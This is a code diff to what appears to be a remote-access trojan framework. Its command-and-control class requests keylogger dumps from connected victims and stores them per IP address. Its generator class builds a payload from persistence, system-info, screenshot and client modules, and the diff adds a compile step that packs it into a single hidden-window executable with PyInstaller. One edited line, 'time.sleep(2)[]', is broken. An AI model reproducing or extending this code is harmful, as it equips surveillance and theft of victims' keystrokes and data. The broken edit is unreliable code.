@@ -426,7 +426,7 @@ class COMMCENTER:
                     self.CURRENT[1].send_data("keylogger:dump")
                     result = self.CURRENT[1].recv_data()
                     dirname = os.path.dirname(__file__)
-                    dirname = os.path.join( dirname, 'keylogs' )
+                    dirname = os.path.join( dirname, 'keylogs')
                     if not os.path.isdir(dirname):
                         os.mkdir(dirname)
                     dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
@@ -681,7 +681,7 @@ class GENERATOR:
         pull.print("File: " + self.output)
     
     def generate(self):
-        time.sleep(2)
+        time.sleep(2)[]
         pull.function("compiling modules......")
         self.data = self.v_imports + "\n\n" + self.v_consts + "\n\n" + self.v_persistence + "\n\n" + self.v_sysinfo + "\n\n" + \
                 self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
@@ -693,6 +693,23 @@ class GENERATOR:
         fl.close()
         pull.print("Code generated successfully!")
 
+    def compile(self):
+        pull.function("Compilin generated code /\\")
+        counter = 1
+
+        t = threading.Thread(target=PyInstaller.__main__.run, args=([
+            '--name=%s' % os.path.basename(self.output),
+            '--onefile',
+            '--windowed',
+            '--log-level=ERROR',
+            '--distpath=%s' % os.path.dirname(self.output),
+            '--workpath=%s' % self.flname[0],
+            os.path.join(self.flname[0], self.flname[2])
+        ],),)
+        t.daemon = True
+        t.start()
         
+
+
 
     
